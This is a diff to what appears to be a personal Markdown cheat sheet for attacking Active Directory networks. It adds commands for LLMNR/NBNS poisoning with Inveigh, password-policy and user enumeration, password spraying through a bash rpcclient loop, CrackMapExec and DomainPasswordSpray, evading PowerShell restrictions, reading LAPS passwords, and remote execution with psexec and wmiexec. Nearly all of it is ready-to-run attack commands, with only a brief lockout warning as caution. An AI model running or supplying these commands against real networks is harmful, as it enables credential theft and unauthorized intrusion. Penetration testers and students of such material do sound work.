@@ -1,4 +1,4 @@
-HYDRA-DC 10.0.2.250
+2HYDRA-DC 10.0.2.250
 punisher 10.0.2.220
 spiderman 10.0.2.221
 # INTERNAL ATTACKS
@@ -113,6 +113,193 @@ impacket-psexec <user>@<DC-IP> -hashes <LM>:<NT>
 ## Inveigh
 *Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.*
 https://github.com/Kevin-Robertson/Inveigh.git
+```
+Import-Module .\Inveigh.ps1
+```
+```
+# NBNS and LLMNR spoofing
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+## Password Attacks
+*Hopefully in a smart way though...*
+**BE CAREFUL ABOUT ACCOUNT LOCKOUTS. DO NOT USE MORE THEN 5 TRIES.**
+
+### Policy Enumeration
+#### Linux Policy Enumeration
+Password policy enumeration 
+CrackMapExec (with valid creds)
+```
+crackmapexec smb <DC-IP> -u <user> -p <pass> --pass-pol
+```
+SMB NULL Session
+```
+rpcclient -U "" -N <DC-IP>
+querydominfo
+getdompwinfo
+```
+Enum4Linux
+```
+enum4linux -P <DC-IP>
+```
+Enum4Linux-ng
+```
+enum4linux-ng -P <DC-IP> -oA <output>
+```
+LDAP Anon Bind
+```
+ldapsearch -h <DC-IP> -x -b "DC=<domain>,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+```
+#### Windows Policy Enumeration
+```
+net use \\DC01\ipc$ "" /u:""
+```
+```
+net use \\DC01\ipc$ "" /u:guest
+```
+```
+net use \\DC01\ipc$ "password" /u:guest
+```
+```
+net use \\DC01\ipc$ "password" /u:guest
+```
+Net.exe
+```
+net accounts
+```
+PowerView
+```
+import-module .\PowerView.ps1
+Get-DomainPolicy
+```
+### User Enumeration
+1. SMB NULL Session
+2. LDAP ANON Bind
+3. Kerbrute
+4. Responder
+5. [LinkedIn2Username](https://github.com/initstring/linkedin2username.git)
+### Kerbrute
+*Internal AD Username Enumerator*
+Install
+```
+sudo git clone https://github.com/ropnop/kerbrute.git
+cd kerbrute
+sudo make all
+```
+Running
+```
+./kerbrute_linux_amd64
+sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
+```
+or 
+```
+kerbrute userenum -d <Domain> --dc 172.16.5.5 jsmith.txt -o <output.txt>
+```
+#### Linux Password Spraying
+Bash one liner
+```
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <DC-IP> | grep Authority; done
+```
+CrackMapExec (filtering for bad logins)
+```
+sudo crackmapexec smb <DC-IP> -u valid_users.txt -p Password123 | grep +
+```
+Logging into SMB
+```
+sudo crackmapexec smb <DC-IP> -u <user> -p <pass>
+```
+Local admin spraying
+```
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrato -H <hash> | grep +
+```
+#### Password Spraying from Windows
+[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray.git) (PowerShell)
+```
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+### Enumerating Security Controls
+#### Windows
+Identify if Defender is active 
+```
+Get-MpComputerStatus
+```
+Applocker (App whitelist)
+```
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+Oftentimes PowerShell can be blocked, but simple measures can be evaded by calling an alternate location of PowerShell like these
+```
+%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+PowerShell_ISE.exe
+```
+Use this to check if Constrained Language Mode is enabled 
+```
+$ExecutionContext.SessionState.LanguageMode
+```
+*Full language mode is what we want*
+
+Windows Local Administrator Password Solution
+*This randomizes and rotates Local Admin passwords*
+Enumerating to see what Domain Admins can see LAPS Passwords
+```
+Find-LAPSDelegatedGroups
+```
+Finding groups and users that can see LAPS passwords
+```
+Find-AdmPwdExtendedRights
+```
+Reading LAPS passwords
+```
+Get-LAPSComputers
+```
+### Credentialed Enumeration
+#### Linux
+Use CrackMapExec (also known as CME or NetExec)
+Enumeration
+```
+sudo crackmapexec smb <DC-IP> -u <user> -p <pass>
+```
+then use the switches for `--users`, `--groups`, `--loggedon-users` or `--shares`
+You can also use spider_plus to scan SMB shares like `-M spider_plus --share '<share>'`
+
+SMBMap
+```
+smbmap -u <user> -p <pass> -d <domain> -H <DC-IP>
+```
+Retrieve all directories
+```
+smbmap -u <user> -p <pass> -d <domain> -H <DC-IP> -R '<share>' --dir-only
+```
+RPCclient (via SMB NULL session)
+```
+rpcclient -U "" -N <DC-IP>
+rpcclient $> queryuser 0x457
+rpcclient $> enumdomusers
+```
+PSExec
+```
+psexec.py <domain>/<user>:'<pass>'@<target-IP>  
+```
+If this doesn't work try prefixing the command with `impacket-`
+
+WMIExec
+```
+wmiexec.py <domain>/<user>:'<pass>'@<DC-IP>  
+```
+Windapsearch
+Domain Admins
+```
+python3 windapsearch.py --dc-ip <DC-IP> -u <user>@<domain> -p <pass> --da
+```
+Priv Users
+```
+python3 windapsearch.py --dc-ip <DC-IP> -u <user>@<domain> -p <pass> -PU
+```
+
+
+
+
+
 
 ## IPv6 DNS Takeover
 *This attack uses the unused IPv6 system to impersonate an IPv6 DNS and runs MiTM with the DC*
@@ -175,23 +362,6 @@ The stored LDAP credentials are usually located on the network settings tab in t
 *As previously seen in MiTM6*
 ```
 sudo ldapdomaindump ldaps://<LDAP_server> -u '<User>' -p <Password> -o <output_file>
-```
-## Kerbrute
-*Internal AD Username Enumerator*
-Install
-```
-sudo git clone https://github.com/ropnop/kerbrute.git
-sudo make all
-ls dist/
-```
-Running
-```
-./kerbrute_linux_amd64
-sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
-```
-or 
-```
-kerbrute userenum -d <Domain> --dc 172.16.5.5 jsmith.txt -o <output.txt>
 ```
 ## Bloodhound
 *Most common AD enumeration tool*
